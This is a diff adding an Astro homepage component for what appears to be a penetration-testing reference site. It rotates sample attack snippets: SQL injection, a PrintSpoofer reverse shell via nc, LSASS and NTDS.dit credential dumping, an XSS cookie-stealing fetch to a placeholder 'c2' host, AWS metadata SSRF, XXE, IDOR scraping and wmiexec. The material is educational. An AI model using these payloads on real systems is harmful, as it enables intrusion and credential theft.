@@ -1,0 +1,172 @@
+---
+// src/components/HomeSample.astro
+//
+// Inline script for the homepage rotating sample block.
+// Lives in an Astro component (rather than an inline <script> in the MDX)
+// because MDX parses braces inside <script> as JSX expressions, which
+// breaks JavaScript object literals.
+//
+// No props - the script targets the homepage DOM by element ID.
+---
+
+<script is:inline>
+  (function () {
+    const SAMPLES = [
+      {
+        tag: 'sqli',
+        topic: 'union-based · mysql',
+        code:
+          "# Extract table names from information_schema\n" +
+          "' UNION SELECT 1,GROUP_CONCAT(table_name),3\n" +
+          "  FROM information_schema.tables\n" +
+          "  WHERE table_schema=database()-- -",
+        link: '/codex/web/sqli/union-based/',
+      },
+      {
+        tag: 'sqli',
+        topic: 'blind · time-based',
+        code:
+          "# Confirm injection via response delay\n" +
+          "1' AND IF(SUBSTRING(database(),1,1)='a',SLEEP(5),0)-- -",
+        link: '/codex/web/sqli/blind/',
+      },
+      {
+        tag: 'privesc',
+        topic: 'windows · SeImpersonate',
+        code:
+          '# Service-account to SYSTEM via Print Spooler (Win 10 1809+ / Server 2019+)\n' +
+          'PrintSpoofer.exe -c "nc.exe 10.10.14.3 443 -e cmd.exe"',
+        link: '/codex/windows/privesc/seimpersonate/',
+      },
+      {
+        tag: 'privesc',
+        topic: 'windows · SeDebug',
+        code:
+          '# Dump LSASS via Microsoft-signed LOLBin (no third-party tool on disk)\n' +
+          'rundll32.exe C:\\Windows\\System32\\comsvcs.dll, MiniDump <LSASS_PID> C:\\Windows\\Temp\\lsass.dmp full',
+        link: '/codex/windows/privesc/sedebugprivilege/',
+      },
+      {
+        tag: 'privesc',
+        topic: 'windows · Backup Operators',
+        code:
+          '# Domain compromise via VSS snapshot + NTDS.dit dump\n' +
+          'diskshadow.exe /s diskshadow.txt           # snapshot C: -> E:\n' +
+          'Copy-FileSeBackupPrivilege E:\\Windows\\NTDS\\ntds.dit .\\ntds.dit\n' +
+          'reg save HKLM\\SYSTEM SYSTEM.SAV\n' +
+          'secretsdump.py -ntds ntds.dit -system SYSTEM.SAV LOCAL',
+        link: '/codex/windows/privesc/backup-operators/',
+      },
+      {
+        tag: 'recon',
+        topic: 'network · smb',
+        code:
+          '# Unauthenticated share enumeration across a /24\n' +
+          "nxc smb 10.10.10.0/24 -u '' -p '' --shares",
+        link: '/codex/network/services/smb/',
+      },
+      {
+        tag: 'recon',
+        topic: 'network · dns',
+        code:
+          '# Try a zone transfer (often left open on misconfigured DNS)\n' +
+          'dig axfr @ns1.target.tld target.tld',
+        link: '/codex/network/services/dns/',
+      },
+      {
+        tag: 'xss',
+        topic: 'web · reflected',
+        code:
+          '# Classic reflected XSS - confirm with a low-noise alert\n' +
+          '"><svg/onload=alert(1)>\n' +
+          '# Then weaponize with a stealthy fetch():\n' +
+          '"><svg/onload="fetch(\'//c2/\'+document.cookie)">',
+        link: '/codex/web/xss/',
+      },
+      {
+        tag: 'ssrf',
+        topic: 'web · server-side',
+        code:
+          '# AWS metadata service v1 - IMDSv1 still common in legacy infra\n' +
+          'http://169.254.169.254/latest/meta-data/iam/security-credentials/',
+        link: '/codex/web/server-side/ssrf/',
+      },
+      {
+        tag: 'xxe',
+        topic: 'web · file read',
+        code:
+          '<!-- Out-of-band exfiltration via FTP -->\n' +
+          '<?xml version="1.0"?>\n' +
+          '<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>\n' +
+          '<root>&xxe;</root>',
+        link: '/codex/web/xxe/',
+      },
+      {
+        tag: 'idor',
+        topic: 'web · authorization',
+        code:
+          '# Sequential ID enumeration on an order-detail endpoint\n' +
+          'for i in $(seq 1 5000); do\n' +
+          '  curl -s -b "session=$COOKIE" "https://app/api/orders/$i" \\\n' +
+          '    -o "orders/$i.json"\n' +
+          'done\n' +
+          'grep -l "credit_card" orders/*.json',
+        link: '/codex/web/idor/',
+      },
+      {
+        tag: 'recon',
+        topic: 'network · wmi',
+        code:
+          '# Remote command execution via WMI (no SMB required)\n' +
+          "wmiexec.py -shell-type powershell DOMAIN/user:'P@ss'@10.10.10.5",
+        link: '/codex/network/services/wmi/',
+      },
+    ];
+
+    const card  = document.getElementById('home-sample-card');
+    const tag   = document.getElementById('home-sample-tag');
+    const topic = document.getElementById('home-sample-topic');
+    const code  = document.getElementById('home-sample-code');
+    const link  = document.getElementById('home-sample-link');
+    const btn   = document.getElementById('home-sample-reroll');
+
+    if (!card || !btn) return;
+
+    let lastIndex = -1;
+    function pick() {
+      if (SAMPLES.length <= 1) return SAMPLES[0];
+      let i;
+      do { i = Math.floor(Math.random() * SAMPLES.length); }
+      while (i === lastIndex);
+      lastIndex = i;
+      return SAMPLES[i];
+    }
+
+    function render(animate) {
+      const s = pick();
+      const apply = function () {
+        tag.textContent = s.tag;
+        topic.textContent = s.topic;
+        code.textContent = s.code;
+        link.setAttribute('href', s.link);
+        card.classList.remove('home-sample__card--in');
+        void card.offsetWidth;
+        card.classList.add('home-sample__card--in');
+      };
+      if (animate) {
+        card.classList.remove('home-sample__card--in');
+        setTimeout(apply, 180);
+      } else {
+        apply();
+      }
+    }
+
+    const first = pick();
+    tag.textContent = first.tag;
+    topic.textContent = first.topic;
+    code.textContent = first.code;
+    link.setAttribute('href', first.link);
+
+    btn.addEventListener('click', function () { render(true); });
+  })();
+</script>
